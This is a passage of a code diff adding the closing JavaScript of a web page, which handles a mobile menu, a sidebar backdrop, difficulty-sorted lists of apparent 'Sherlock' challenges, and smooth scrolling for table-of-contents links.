+                backdrop.classList.toggle('active');
+            });
+            
+            backdrop.addEventListener('click', () => {
+                hamburgerMenu.classList.remove('active');
+                sidebar.classList.remove('active');
+                backdrop.classList.remove('active');
+                tocSidebar.classList.remove('active');
+            });
+            
+            // Difficulty buttons functionality
+            const difficultyButtons = document.querySelectorAll('.difficulty-btn');
+            
+            difficultyButtons.forEach(button => {
+                button.addEventListener('click', () => {
+                    const difficulty = button.getAttribute('data-difficulty');
+                    const sherlockList = document.querySelector(`#${difficulty}-sherlocks`);
+                    
+                    sherlockList.classList.toggle('active');
+                });
+            });
+            
+            // Mobile TOC toggle
+            const tocToggle = document.querySelector('.toc-toggle');
+            const tocSidebar = document.querySelector('.toc-sidebar');
+            
+            tocToggle.addEventListener('click', () => {
+                tocSidebar.classList.toggle('active');
+                backdrop.classList.toggle('active');
+            });
+            
+            // Close TOC sidebar when clicking on a link (mobile)
+            document.querySelectorAll('.toc-sidebar a').forEach(link => {
+                link.addEventListener('click', () => {
+                    if (window.innerWidth <= 1024) {
+                        tocSidebar.classList.remove('active');
+                        backdrop.classList.remove('active');
+                    }
+                });
+            });
+        });
+
+        // Add smooth scrolling for TOC links
+        document.addEventListener('click', function(e) {
+            if (e.target.tagName === 'A' && e.target.hash) {
+                const element = document.querySelector(e.target.hash);
+                if (element) {
+                    e.preventDefault();
+                    window.scrollTo({
+                        top: element.offsetTop - 90,
+                        behavior: 'smooth'
+                    });
+                }
+            }
+        });
+    </script>
+</body>
+</html>
